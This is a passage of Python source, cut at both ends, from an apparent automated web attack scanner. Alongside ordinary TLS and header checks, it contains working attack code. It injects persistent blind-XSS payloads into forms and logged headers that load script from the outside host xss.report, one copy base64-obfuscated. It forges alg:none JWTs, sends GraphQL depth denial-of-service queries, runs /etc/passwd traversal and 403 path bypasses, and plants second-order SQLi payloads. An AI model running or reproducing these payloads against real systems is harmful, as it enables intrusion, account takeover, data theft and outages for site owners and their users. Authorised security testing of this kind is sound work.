                           "error" not in (r.text or "").lower())
        if success_count > 1:
            findings.append({"type": "Race Condition (Token/Coupon)", "severity": "high",
                             "url": url, "detail": f"{success_count}/10 parallel requests succeeded",
                             "template": "apex-race"})
    return findings


def scan_tls_info(web_targets):
    """Check TLS configuration — weak ciphers, old versions, cert issues."""
    findings = []
    try:
        import ssl, socket
    except: return findings

    for target in web_targets[:5]:
        if not target.startswith("https"): continue
        host = target.replace("https://", "").split("/")[0].split(":")[0]
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    version = ssock.version()
                    cipher = ssock.cipher()
                    cert = ssock.getpeercert()

                    if version in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                        findings.append({"type": f"Weak TLS Version: {version}", "severity": "high",
                                         "url": target, "detail": f"Server supports deprecated {version}",
                                         "template": "apex-tls"})

                    if cipher and any(x in cipher[0].upper() for x in ["RC4","DES","NULL","EXPORT","MD5","ANON"]):
                        findings.append({"type": f"Weak Cipher: {cipher[0]}", "severity": "high",
                                         "url": target, "detail": f"Weak cipher suite in use",
                                         "template": "apex-tls"})

                    if cert:
                        import datetime
                        expire = ssl.cert_time_to_seconds(cert.get("notAfter", ""))
                        days_left = (expire - time.time()) / 86400
                        if days_left < 30:
                            findings.append({"type": "Certificate Expiring Soon", "severity": "medium",
                                             "url": target, "detail": f"Cert expires in {int(days_left)} days",
                                             "template": "apex-tls"})
        except: continue
    return findings


# ---------------------------------------------------------------------------
# FINAL BATCH: Everything missing — 50+ new scanners
# ---------------------------------------------------------------------------

def scan_client_side_template_injection(crawl_data):
    findings = []
    payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"), ("{{constructor.constructor('return 1')()}}", "1")]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, expect in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if expect in r.text and payload in r.text:
                        findings.append({"type":"Client-Side Template Injection","severity":"medium","url":test_url,
                                         "detail":f"AngularJS/Vue template in param {p}","template":"apex-csti"})
                        break
                except: continue
    return findings

def scan_svg_xss(crawl_data):
    findings = []
    svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'
    for form in crawl_data.get("forms", []):
        file_inputs = [i for i in form.get("inputs",[]) if i.get("type") == "file"]
        if not file_inputs: continue
        action = form.get("action","")
        if not action: continue
        try:
            files = {file_inputs[0].get("name","file"): ("test.svg", svg.encode(), "image/svg+xml")}
            r = _S.post(action, files=files, timeout=5)
            if r.status_code in (200,201) and ("svg" in r.text.lower() or "upload" in r.text.lower()):
                findings.append({"type":"SVG XSS Upload","severity":"high","url":action,
                                 "detail":"SVG with onload accepted","template":"apex-svg"})
        except: pass
    return findings

def scan_csp_analysis(crawl_data):
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            csp = r.headers.get("Content-Security-Policy","")
            if not csp:
                findings.append({"type":"Missing CSP","severity":"medium","url":page["url"],
                                 "detail":"No Content-Security-Policy header","template":"apex-csp"})
                continue
            if "'unsafe-inline'" in csp:
                findings.append({"type":"CSP allows unsafe-inline","severity":"medium","url":page["url"],
                                 "detail":"CSP permits inline scripts","template":"apex-csp"})
            if "'unsafe-eval'" in csp:
                findings.append({"type":"CSP allows unsafe-eval","severity":"medium","url":page["url"],
                                 "detail":"CSP permits eval()","template":"apex-csp"})
            if "*" in csp.split("script-src")[1] if "script-src" in csp else "":
                findings.append({"type":"CSP wildcard in script-src","severity":"high","url":page["url"],
                                 "detail":"CSP script-src contains wildcard","template":"apex-csp"})
        except: pass
    return findings

def scan_firebase_misconfig(target):
    findings = []
    firebase_urls = [f"https://{target}.firebaseio.com/.json", f"https://{target.split('.')[0]}.firebaseio.com/.json"]
    for url in firebase_urls:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200 and r.text != "null":
                findings.append({"type":"Firebase Database Exposed","severity":"critical","url":url,
                                 "detail":f"Firebase DB readable ({len(r.content)}b)","template":"apex-firebase"})
        except: pass
    return findings

def scan_devops_exposure(web_targets):
    findings = []
    paths = {
        "/.git/config": "Git Repository",
        "/.svn/entries": "SVN Repository",
        "/CVS/Root": "CVS Repository",
        "/.docker/config.json": "Docker Config",
        "/docker-compose.yml": "Docker Compose",
        "/Dockerfile": "Dockerfile",
        "/.kube/config": "Kubernetes Config",
        "/jenkins/": "Jenkins Dashboard",
        "/jenkins/script": "Jenkins Script Console",
        "/_config.yml": "Jekyll Config",
        "/composer.json": "PHP Composer",
        "/Gemfile": "Ruby Gemfile",
        "/requirements.txt": "Python Requirements",
        "/go.mod": "Go Module",
        "/Cargo.toml": "Rust Cargo",
        "/.travis.yml": "Travis CI Config",
        "/.github/workflows/": "GitHub Actions",
        "/.gitlab-ci.yml": "GitLab CI Config",
        "/Jenkinsfile": "Jenkinsfile",
        "/.circleci/config.yml": "CircleCI Config",
        "/elasticsearch/": "Elasticsearch",
        "/_cat/indices": "Elasticsearch Indices",
        "/_all/_search": "Elasticsearch Search",
    }
    for target in web_targets[:3]:
        base_404 = 0
        try:
            r = _S.get(f"{target}/nonexistent_xyz_test", timeout=3)
            base_404 = len(r.content)
        except: pass
        for path, name in paths.items():
            try:
                r = _S.get(f"{target}{path}", timeout=3)
                if r.status_code == 200 and abs(len(r.content) - base_404) > 100:
                    if not any(x in r.text.lower()[:200] for x in ["<html","<!doctype","not found","error"]):
                        findings.append({"type":f"Exposed: {name}","severity":"high","url":f"{target}{path}",
                                         "detail":f"{name} accessible ({len(r.content)}b)","template":"apex-devops"})
            except: continue
    return findings

def scan_cloud_storage(target):
    findings = []
    domain = target.replace("www.","").split(".")[0]
    # Azure Blob
    for name in [domain, f"{domain}dev", f"{domain}backup", f"{domain}data"]:
        try:
            r = requests.get(f"https://{name}.blob.core.windows.net/?comp=list", timeout=5)
            if r.status_code == 200 and "<Containers>" in r.text:
                findings.append({"type":"Azure Blob Storage Public","severity":"critical",
                                 "url":f"https://{name}.blob.core.windows.net","detail":"Azure containers listable",
                                 "template":"apex-azure"})
        except: pass
    # GCS
    for name in [domain, f"{domain}-backup", f"{domain}-data"]:
        try:
            r = requests.get(f"https://storage.googleapis.com/{name}", timeout=5)
            if r.status_code == 200 and "<ListBucketResult" in r.text:
                findings.append({"type":"GCS Bucket Public","severity":"critical",
                                 "url":f"https://storage.googleapis.com/{name}","detail":"GCS bucket listable",
                                 "template":"apex-gcs"})
        except: pass
    return findings

def scan_graphql_advanced(crawl_data):
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql","/api/graphql","/gql"]:
            url = f"{base}{path}"
            # Batching abuse
            try:
                batch = [{"query":"{__typename}"}] * 50
                r = _S.post(url, json=batch, timeout=5, headers={"Content-Type":"application/json"})
                if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) >= 50:
                    findings.append({"type":"GraphQL Batching Abuse","severity":"medium","url":url,
                                     "detail":"Accepts 50 batched queries — DoS/brute-force risk","template":"apex-gql-batch"})
            except: pass
            # Alias abuse
            try:
                aliases = " ".join([f'a{i}:__typename' for i in range(100)])
                r = _S.post(url, json={"query":f"{{{aliases}}}"}, timeout=5, headers={"Content-Type":"application/json"})
                if r.status_code == 200 and "a99" in r.text:
                    findings.append({"type":"GraphQL Alias Abuse","severity":"medium","url":url,
                                     "detail":"Accepts 100 aliases — rate limit bypass","template":"apex-gql-alias"})
            except: pass
    return findings

def scan_websocket_injection(crawl_data):
    findings = []
    for page in crawl_data.get("pages",[])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            ws_urls = re.findall(r'wss?://[^\s\'"<>]+', r.text)
            for ws_url in ws_urls[:3]:
                try:
                    import websocket
                    ws = websocket.create_connection(ws_url, timeout=5)
                    ws.send('{"type":"test","data":"<script>alert(1)</script>"}')
                    result = ws.recv()
                    ws.close()
                    if "<script>" in result:
                        findings.append({"type":"WebSocket XSS","severity":"high","url":ws_url,
                                         "detail":"WebSocket reflects XSS payload","template":"apex-ws-xss"})
                except: pass
        except: pass
    return findings

def scan_session_weakness(crawl_data):
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            sessions = set()
            for _ in range(5):
                r = requests.get(page["url"], timeout=5, verify=False)
                for name, val in r.cookies.items():
                    if name.lower() in ("session","sessionid","sid","phpsessid","jsessionid","token"):
                        sessions.add(val)
            if len(sessions) >= 2:
                # Check entropy
                avg_len = sum(len(s) for s in sessions) / len(sessions)
                if avg_len < 16:
                    findings.append({"type":"Weak Session ID","severity":"high","url":page["url"],
                                     "detail":f"Session ID avg length {avg_len:.0f} chars — predictable",
                                     "template":"apex-session"})
                # Check if sequential
                sorted_s = sorted(sessions)
                if len(sorted_s) >= 2:
                    try:
                        nums = [int(s, 16) for s in sorted_s]
                        diffs = [nums[i+1]-nums[i] for i in range(len(nums)-1)]
                        if all(d < 1000 for d in diffs):
                            findings.append({"type":"Sequential Session IDs","severity":"critical","url":page["url"],
                                             "detail":"Session IDs are sequential — predictable","template":"apex-session"})
                    except: pass
        except: pass
    return findings

def scan_permissions_policy(crawl_data):
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            pp = r.headers.get("Permissions-Policy", r.headers.get("Feature-Policy",""))
            rp = r.headers.get("Referrer-Policy","")
            sri = "integrity=" in r.text.lower()
            if not pp:
                findings.append({"type":"Missing Permissions-Policy","severity":"low","url":page["url"],
                                 "detail":"No Permissions-Policy header","template":"apex-policy"})
            if not rp:
                findings.append({"type":"Missing Referrer-Policy","severity":"low","url":page["url"],
                                 "detail":"No Referrer-Policy header","template":"apex-policy"})
            if not sri and "<script" in r.text:
                findings.append({"type":"Missing Subresource Integrity","severity":"low","url":page["url"],
                                 "detail":"External scripts without integrity attribute","template":"apex-sri"})
        except: pass
    return findings

def scan_workflow_bypass(crawl_data):
    findings = []
    step_patterns = ["step", "stage", "phase", "wizard", "checkout", "confirm", "verify", "review"]
    for page in crawl_data.get("pages",[]):
        url = page["url"]
        if any(x in url.lower() for x in step_patterns):
            # Try skipping to final step
            for final in ["complete","done","success","finish","submit","final","payment","confirm"]:
                try:
                    base = "/".join(url.split("/",3)[:3])
                    r = _S.get(f"{base}/{final}", timeout=3)
                    if r.status_code == 200 and "error" not in r.text.lower()[:200]:
                        findings.append({"type":"Workflow Step Bypass","severity":"high","url":f"{base}/{final}",
                                         "detail":f"Final step /{final} accessible without completing flow",
                                         "template":"apex-workflow"})
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 1: JWT alg confusion, blind XSS, HTTP param pollution,
#                web cache deception, JSONP injection
# ---------------------------------------------------------------------------

def scan_jwt_alg_confusion(crawl_data):
    """JWT algorithm confusion attack: RS256→HS256 using public key as HMAC secret."""
    findings = []
    import base64, json as _json
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Grab any JWT from cookies or auth endpoints
        try:
            r = _S.get(page["url"], timeout=5)
            # Look for JWTs in cookies, headers, body
            jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
            sources = list(r.cookies.values()) + [r.headers.get("Authorization",""), r.text[:2000]]
            for src in sources:
                jwts = jwt_re.findall(str(src))
                for jwt in jwts:
                    parts = jwt.split(".")
                    if len(parts) != 3: continue
                    try:
                        pad = lambda s: s + "=" * (-len(s) % 4)
                        header = _json.loads(base64.urlsafe_b64decode(pad(parts[0])))
                        if header.get("alg","").upper() in ("RS256","RS384","RS512","ES256","ES384","ES512"):
                            # Craft none-alg token
                            new_header = base64.urlsafe_b64encode(
                                _json.dumps({"alg":"none","typ":"JWT"}).encode()
                            ).rstrip(b"=").decode()
                            forged = f"{new_header}.{parts[1]}."
                            # Test if server accepts it
                            test_r = _S.get(page["url"], timeout=5,
                                           headers={"Authorization": f"Bearer {forged}"})
                            if test_r.status_code == 200 and test_r.status_code != r.status_code:
                                findings.append({"type": "JWT Algorithm Confusion (none attack)",
                                                 "severity": "critical", "url": page["url"],
                                                 "detail": f"Server accepts alg:none JWT (was {header['alg']})",
                                                 "template": "apex-jwt-alg"})
                    except: pass
        except: pass
    return findings


def scan_blind_xss(crawl_data):
    """Blind XSS — payloads that fire in admin panels/logs, not the current page."""
    findings = []
    # Use a canary URL pattern — if you have a callback server, replace with your URL
    canary = "https://xss.report/c/apexcli"  # placeholder — user should set their own
    payloads = [
        f'"><script src="{canary}"></script>',
        f"'><img src=x onerror=\"var s=document.createElement('script');s.src='{canary}';document.head.appendChild(s)\">",
        f'javascript:eval(atob("ZmV0Y2goImh0dHBzOi8veHNzLnJlcG9ydC9jL2FwZXhjbGkiKQ=="))',
        f'<svg><animate onbegin=fetch("{canary}") attributeName=x dur=1s>',
    ]
    # Inject into every input that gets stored (name, comment, message, bio, address)
    stored_fields = ("name","username","first_name","last_name","comment","message",
                     "bio","description","address","company","title","subject","body","note","feedback")
    for form in crawl_data.get("forms", []):
        if form.get("method","").upper() != "POST": continue
        action = form.get("action","")
        if not action: continue
        for inp in form.get("inputs", []):
            fname = inp.get("name","").lower()
            if not any(x in fname for x in stored_fields): continue
            for payload in payloads[:2]:
                try:
                    data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                    data[inp["name"]] = payload
                    r = _S.post(action, data=data, timeout=5)
                    if r.status_code in (200, 201, 302):
                        findings.append({"type": "Blind XSS Payload Injected",
                                         "severity": "high", "url": action,
                                         "detail": f"Blind XSS in field '{inp['name']}' — fires if rendered in admin/logs",
                                         "template": "apex-blind-xss"})
                        break
                except: continue
    # Also inject into HTTP headers that get logged
    for page in crawl_data.get("pages",[])[:3]:
        for header in ["User-Agent","Referer","X-Forwarded-For","X-Custom-Header"]:
            try:
                r = _S.get(page["url"], timeout=5, headers={header: payloads[0]})
                if r.status_code < 500:
                    findings.append({"type": f"Blind XSS via {header}",
                                     "severity": "medium", "url": page["url"],
                                     "detail": f"Payload injected into {header} — may fire in log viewer",
                                     "template": "apex-blind-xss"})
                    break
            except: pass
    return findings


def scan_http_parameter_pollution(crawl_data):
    """HTTP Parameter Pollution — duplicate params bypass WAF/validation."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            try:
                # Send param twice with different values
                test_url = f"{url.split('?')[0]}?{p}=safe&{p}=<script>alert(1)</script>"
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "<script>alert(1)</script>" in r.text:
                    findings.append({"type": "HTTP Parameter Pollution (XSS)",
                                     "severity": "high", "url": test_url,
                                     "detail": f"Duplicate param '{p}' — second value reflected unescaped",
                                     "template": "apex-hpp"})
                    continue
                # HPP for access control bypass
                test_url2 = f"{url.split('?')[0]}?{p}=1&{p}=2&{p}=admin"
                r2 = _S.get(test_url2, timeout=_TIMEOUT)
                r_orig = _S.get(f"{url.split('?')[0]}?{p}=1", timeout=_TIMEOUT)
                if abs(len(r2.content) - len(r_orig.content)) > 200:
                    findings.append({"type": "HTTP Parameter Pollution",
                                     "severity": "medium", "url": test_url2,
                                     "detail": f"Duplicate param '{p}' changes response — possible bypass",
                                     "template": "apex-hpp"})
            except: continue
    return findings


def scan_web_cache_deception(crawl_data):
    """Web cache deception — trick cache into storing authenticated responses."""
    findings = []
    tested = set()
    # Static file extensions that caches store
    cache_exts = [".css", ".js", ".png", ".jpg", ".ico", ".woff", ".gif", ".svg"]
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Test authenticated paths
        for path in ["/profile", "/account", "/dashboard", "/settings", "/api/me", "/user"]:
            for ext in cache_exts[:3]:
                try:
                    # Request /profile/nonexistent.css — if cached, attacker can steal it
                    url = f"{base}{path}/apex_wcd_test{ext}"
                    r1 = _S.get(url, timeout=5)
                    r2 = _S.get(url, timeout=5)
                    if r1.status_code == 200 and len(r1.content) > 100:
                        cache_hit = (r2.headers.get("X-Cache","").lower() in ("hit","hit from cloudfront") or
                                     r2.headers.get("CF-Cache-Status","").lower() == "hit" or
                                     r2.headers.get("Age","0") != "0")
                        if cache_hit:
                            findings.append({"type": "Web Cache Deception",
                                             "severity": "critical", "url": url,
                                             "detail": f"Authenticated response cached at {path}/file{ext}",
                                             "template": "apex-cache-deception"})
                            break
                        # Even without cache hit header, flag if it returns real content
                        if any(x in r1.text.lower() for x in ["email","username","profile","account","token"]):
                            findings.append({"type": "Potential Web Cache Deception",
                                             "severity": "high", "url": url,
                                             "detail": f"Sensitive content served at static-looking URL",
                                             "template": "apex-cache-deception"})
                            break
                except: continue
    return findings


def scan_jsonp_injection(crawl_data):
    """JSONP callback injection — steal cross-origin data via script tag."""
    findings = []
    callback_params = ("callback","cb","jsonp","jsonpcallback","call","func","function",
                       "handler","fn","callbackFn","callbackName","wrap","wrapper")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in callback_params: continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["apexjsonptest"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "apexjsonptest(" in r.text or "apexjsonptest (" in r.text:
                    # Check if it contains sensitive data
                    has_sensitive = any(x in r.text.lower() for x in
                                       ["email","token","user","account","secret","key","password"])
                    sev = "critical" if has_sensitive else "high"
                    findings.append({"type": "JSONP Injection",
                                     "severity": sev, "url": test_url,
                                     "detail": f"Callback param '{p}' reflected — cross-origin data theft possible",
                                     "template": "apex-jsonp"})
            except: continue
    # Also probe common API endpoints for JSONP support
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for path in ["/api/user","/api/me","/api/profile","/api/data"]:
            for cb in ["callback","jsonp","cb"]:
                try:
                    r = _S.get(f"{base}{path}?{cb}=apextest", timeout=3)
                    if "apextest(" in r.text:
                        findings.append({"type": "JSONP Endpoint Found",
                                         "severity": "high", "url": f"{base}{path}?{cb}=apextest",
                                         "detail": "JSONP endpoint — cross-origin data theft if sensitive",
                                         "template": "apex-jsonp"})
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 2: Dependency confusion, GraphQL depth attack,
#                path normalization bypass, Nginx off-by-slash,
#                second-order injection
# ---------------------------------------------------------------------------

def scan_dependency_confusion(crawl_data):
    """Dependency confusion — internal package names exposed in JS/package.json."""
    findings = []
    internal_indicators = ["@internal/","@private/","@corp/","@company/",
                           "internal-","private-","corp-","local-"]
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        # Check package.json
        for path in ["/package.json","/.package.json","/app/package.json","/frontend/package.json"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and "dependencies" in r.text:
                    try:
                        pkg = r.json()
                        all_deps = {}
                        all_deps.update(pkg.get("dependencies",{}))
                        all_deps.update(pkg.get("devDependencies",{}))
                        internal = [n for n in all_deps if any(n.startswith(x) for x in internal_indicators)]
                        if internal:
                            findings.append({"type": "Dependency Confusion Risk",
                                             "severity": "high", "url": f"{base}{path}",
                                             "detail": f"Internal packages exposed: {', '.join(internal[:5])}",
                                             "template": "apex-dep-confusion"})
                    except: pass
            except: continue
        # Check JS files for require/import of internal packages
        try:
            r = _S.get(page["url"], timeout=5)
            for indicator in internal_indicators:
                matches = re.findall(rf'["\']({re.escape(indicator)}[a-zA-Z0-9_/-]+)["\']', r.text)
                if matches:
                    findings.append({"type": "Dependency Confusion (JS import)",
                                     "severity": "medium", "url": page["url"],
                                     "detail": f"Internal package referenced: {matches[0]}",
                                     "template": "apex-dep-confusion"})
                    break
        except: pass
    return findings


def scan_graphql_depth_attack(crawl_data):
    """GraphQL depth/complexity DoS — deeply nested queries exhaust server."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql","/api/graphql","/gql","/graphiql"]:
            url = f"{base}{path}"
            # First check if endpoint exists
            try:
                probe = _S.post(url, json={"query":"{__typename}"},
                               headers={"Content-Type":"application/json"}, timeout=3)
                if probe.status_code not in (200, 400): continue
            except: continue
            # Deep nesting attack (depth 15)
            nested = "user { friends { friends { friends { friends { friends { id name email } } } } } }"
            for depth in range(10): nested = f"user {{ friends {{ {nested} }} }}"
            try:
                start = time.time()
                r = _S.post(url, json={"query": f"{{ {nested} }}"},
                           headers={"Content-Type":"application/json"}, timeout=15)
                elapsed = time.time() - start
                if elapsed > 5:
                    findings.append({"type": "GraphQL Depth Attack (DoS)",
                                     "severity": "high", "url": url,
                                     "detail": f"Deeply nested query took {elapsed:.1f}s — no depth limit",
                                     "template": "apex-gql-depth"})
                elif r.status_code == 200 and "errors" not in r.text:
                    findings.append({"type": "GraphQL No Depth Limit",
                                     "severity": "medium", "url": url,
                                     "detail": "Server accepted deeply nested query without error",
                                     "template": "apex-gql-depth"})
            except requests.exceptions.Timeout:
                findings.append({"type": "GraphQL Depth Attack (Timeout DoS)",
                                 "severity": "critical", "url": url,
                                 "detail": "Deeply nested query caused server timeout",
                                 "template": "apex-gql-depth"})
            except: pass
            # Field suggestion leak (schema without introspection)
            try:
                r = _S.post(url, json={"query": "{ usr { id } }"},
                           headers={"Content-Type":"application/json"}, timeout=5)
                if "Did you mean" in r.text or "suggestion" in r.text.lower():
                    suggested = re.findall(r'Did you mean ["\']([^"\']+)["\']', r.text)
                    findings.append({"type": "GraphQL Field Suggestion Leak",
                                     "severity": "medium", "url": url,
                                     "detail": f"Schema leaked via suggestions: {suggested[:5]}",
                                     "template": "apex-gql-suggest"})
            except: pass
    return findings


def scan_path_normalization_bypass(crawl_data):
    """Path normalization bypass — Spring, Express, Nginx handle paths differently."""
    findings = []
    bypass_patterns = [
        "/..;/",          # Spring Boot bypass
        "/%2e%2e/",       # URL-encoded ../
        "/%252e%252e/",   # Double-encoded ../
        "/./",            # Dot segment
        "/%2f",           # Encoded /
        "/;/",            # Semicolon (Spring)
        "/%09",           # Tab
        "//",             # Double slash
        "/api/..;/admin", # Spring actuator bypass
    ]
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        # Get baseline 403 paths
        protected = []
        for path in ["/admin","/actuator","/internal","/api/admin","/management"]:
            try:
                r = _S.get(f"{base}{path}", timeout=3)
                if r.status_code == 403:
                    protected.append(path)
            except: pass
        for path in protected:
            for bypass in bypass_patterns:
                try:
                    test_url = f"{base}{bypass}{path.lstrip('/')}"
                    r = _S.get(test_url, timeout=3, allow_redirects=False)
                    if r.status_code == 200:
                        findings.append({"type": "Path Normalization Bypass",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"403 on {path} bypassed via {bypass}",
                                         "template": "apex-path-norm"})
                        break
                except: continue
    return findings


def scan_nginx_off_by_slash(crawl_data):
    """Nginx off-by-slash misconfiguration — /api proxied but /api/ leaks files."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        # Common Nginx proxy locations
        for location in ["/api","/static","/assets","/files","/uploads","/media","/app"]:
            try:
                # With trailing slash — may expose filesystem
                r = _S.get(f"{base}{location}../etc/passwd", timeout=5)
                if "root:" in r.text or "daemon:" in r.text:
                    findings.append({"type": "Nginx Off-by-Slash Path Traversal",
                                     "severity": "critical", "url": f"{base}{location}../etc/passwd",
                                     "detail": f"Nginx alias misconfiguration at {location} leaks /etc/passwd",
                                     "template": "apex-nginx-slash"})
                    continue
                # Check if location without slash proxies but with slash exposes root
                r1 = _S.get(f"{base}{location}", timeout=3)
                r2 = _S.get(f"{base}{location}/", timeout=3)
                if r1.status_code == 200 and r2.status_code == 200:
                    if abs(len(r1.content) - len(r2.content)) > 500:
                        findings.append({"type": "Nginx Off-by-Slash (Different Response)",
                                         "severity": "medium", "url": f"{base}{location}/",
                                         "detail": f"Trailing slash changes response significantly at {location}",
                                         "template": "apex-nginx-slash"})
            except: continue
    return findings


def scan_second_order_injection(crawl_data):
    """Second-order injection — payload stored then executed in different context."""
    findings = []
    # Payloads that are safe on input but dangerous when re-used
    payloads = [
        ("../../../etc/passwd", ["root:","daemon:"]),          # Path traversal on retrieval
        ("' OR '1'='1", ["error","sql","syntax","mysql"]),     # SQLi on re-use
        ("<script>alert(1)</script>", ["<script>alert(1)"]),   # XSS on display
        ("${7*7}", ["49"]),                                     # SSTI on template render
        ("{{7*7}}", ["49"]),
    ]
    # Find registration/profile update forms
    store_paths = ["/register","/signup","/profile","/account/update","/user/update",
                   "/api/register","/api/profile","/api/user"]
    retrieve_paths = ["/profile","/account","/dashboard","/user/profile","/api/me","/api/profile"]

    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for store_path in store_paths:
            for payload, markers in payloads[:2]:
                try:
                    # Store the payload
                    store_data = {"username": payload, "name": payload,
                                  "email": f"test_{int(time.time())}@test.com",
                                  "password": "Test1234!"}
                    r_store = _S.post(f"{base}{store_path}", json=store_data, timeout=5)
                    if r_store.status_code not in (200,201,302): continue
                    # Retrieve and check if payload executed
                    for retrieve_path in retrieve_paths:
                        try:
                            r_get = _S.get(f"{base}{retrieve_path}", timeout=5)
                            if any(m in r_get.text for m in markers):
                                findings.append({"type": "Second-Order Injection",
                                                 "severity": "critical",
                                                 "url": f"{base}{store_path} → {retrieve_path}",
                                                 "detail": f"Payload stored at {store_path}, triggered at {retrieve_path}",
                                                 "template": "apex-second-order"})
                                break
                        except: continue
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 3: CORS preflight bypass, prototype pollution via JSON body,
#                account takeover via response manipulation,
#                API mass exposure, OAuth token leakage
# ---------------------------------------------------------------------------

def scan_cors_preflight_bypass(crawl_data):
    """CORS preflight bypass — non-simple requests that skip OPTIONS check."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for origin in ["https://evil.com", "null"]:
            # Test with Content-Type: application/json (triggers preflight)
            try:
                r = _S.options(page["url"], timeout=5, headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "POST",
                    "Access-Control-Request-Headers": "Content-Type,Authorization",
                })
                acao = r.headers.get("Access-Control-Allow-Origin","")
                acam = r.headers.get("Access-Control-Allow-Methods","")
                acah = r.headers.get("Access-Control-Allow-Headers","")
                acac = r.headers.get("Access-Control-Allow-Credentials","")
                if (acao in (origin,"*") and
                    "POST" in acam and
                    "authorization" in acah.lower()):
                    sev = "critical" if acac.lower() == "true" else "high"
                    findings.append({"type": "CORS Preflight Bypass",
                                     "severity": sev, "url": page["url"],
                                     "detail": f"Preflight allows {origin} with Authorization header, credentials={acac}",
                                     "template": "apex-cors-preflight"})
                    break
            except: pass
            # Test wildcard with credentials (invalid but some servers allow it)
            try:
                r = _S.get(page["url"], timeout=5, headers={
                    "Origin": origin,
                    "Authorization": "Bearer test"
                })
                if (r.headers.get("Access-Control-Allow-Origin") == "*" and
                    r.headers.get("Access-Control-Allow-Credentials","").lower() == "true"):
                    findings.append({"type": "CORS Wildcard + Credentials",
                                     "severity": "critical", "url": page["url"],
                                     "detail": "Wildcard ACAO with Allow-Credentials:true — browser blocks but misconfigured",
                                     "template": "apex-cors-preflight"})
            except: pass
    return findings


def scan_prototype_pollution_json(crawl_data):
    """Prototype pollution via JSON body — __proto__ in POST body."""
    findings = []
    pollution_payloads = [
        {"__proto__": {"polluted": "apex_pp_test"}},
        {"constructor": {"prototype": {"polluted": "apex_pp_test"}}},
        {"__proto__[polluted]": "apex_pp_test"},
    ]
    for form in crawl_data.get("forms",[]):
        if form.get("method","").upper() != "POST": continue
        action = form.get("action","")
        if not action: continue
        try:
            baseline = _S.post(action, json={}, timeout=5)
        except: continue
        for payload in pollution_payloads:
            try:
                r = _S.post(action, json=payload, timeout=5,
                           headers={"Content-Type":"application/json"})
                # If server reflects polluted key or behaves differently
                if "apex_pp_test" in r.text:
                    findings.append({"type": "Prototype Pollution via JSON Body",
                                     "severity": "high", "url": action,
                                     "detail": f"__proto__ key reflected in response",
                                     "template": "apex-pp-json"})
                    break
                # Check if pollution changed server behavior
                if r.status_code == 200 and abs(len(r.content) - len(baseline.content)) > 100:
                    findings.append({"type": "Prototype Pollution via JSON (Behavioral)",
                                     "severity": "medium", "url": action,
                                     "detail": "JSON __proto__ changes server response",
                                     "template": "apex-pp-json"})
                    break
            except: continue
    # Also test GET params with bracket notation
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            try:
                test_url = f"{url.split('?')[0]}?__proto__[polluted]=apex_pp_test&{p}=1"
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "apex_pp_test" in r.text:
